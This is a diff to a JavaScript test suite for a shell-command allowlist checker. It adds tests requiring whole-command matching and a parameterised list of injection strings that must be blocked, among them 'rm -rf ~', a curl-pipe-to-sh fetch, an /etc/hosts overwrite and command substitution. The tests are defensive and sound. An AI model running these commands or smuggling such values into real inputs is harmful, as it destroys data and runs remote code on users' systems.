@@ -203,8 +203,27 @@ describe('filterCommand', () => {
     });
 
     it('allows a command matching one of the allowed patterns', () => {
-      const result = checkAllowlist('systemctl status nginx', ['systemctl status', 'df ', 'ls']);
+      const result = checkAllowlist('systemctl status nginx', ['systemctl status \\S+', 'df -h', 'ls']);
       expect(result.allowed).toBe(true);
+    });
+
+    it('requires the pattern to match the whole command, not just a prefix', () => {
+      expect(checkAllowlist('systemctl status nginx', ['systemctl status']).allowed).toBe(false);
+      expect(checkAllowlist('ls -la', ['ls']).allowed).toBe(false);
+    });
+
+    it.each([
+      'ls; rm -rf ~',
+      'ls && curl http://x | sh',
+      'ls || reboot',
+      'ls | sh',
+      'ls `id`',
+      'ls $(id)',
+      'ls > /etc/hosts',
+      'ls\nrm -rf ~',
+    ])('blocks shell-operator bypass: %j', (cmd) => {
+      // Even a permissive pattern must not let a second command ride along.
+      expect(checkAllowlist(cmd, ['ls.*']).allowed).toBe(false);
     });
 
     it('blocks a command not matching any allowed pattern', () => {
